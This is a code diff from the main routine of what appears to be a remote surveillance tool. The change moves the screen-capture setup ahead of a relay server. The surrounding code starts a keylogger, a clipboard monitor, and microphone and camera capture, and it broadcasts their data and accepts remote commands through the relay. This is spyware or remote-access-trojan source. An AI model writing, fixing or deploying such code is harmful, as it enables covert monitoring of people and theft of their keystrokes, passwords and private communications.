@@ -190,15 +190,15 @@ def main():
 
     mic = mic_mod.MicCapture(on_chunk=broadcast_audio)
     camera = cam.CameraCapture(on_frame=broadcast_camera, fps=8, quality=40)
+    capture = sc.ScreenCapture(broadcast_frame, fps=25, quality=82, scale=0.85)
+    capture.attach_recorder(recorder)
+    # capture starts on-demand when viewer clicks ▶ Start JPEG Stream
     server.init(controller.handle_command, recorder, camera, mic)
     if relay:
         relay.init(controller.handle_command, recorder, camera, mic, capture)
         relay.run()
 
     kl.Keylogger(broadcast_key).start()
-    capture = sc.ScreenCapture(broadcast_frame, fps=25, quality=82, scale=0.85)
-    capture.attach_recorder(recorder)
-    # capture starts on-demand when viewer clicks ▶ Start JPEG Stream
     cb.ClipboardMonitor(broadcast_clipboard).start()
 
     threading.Thread(
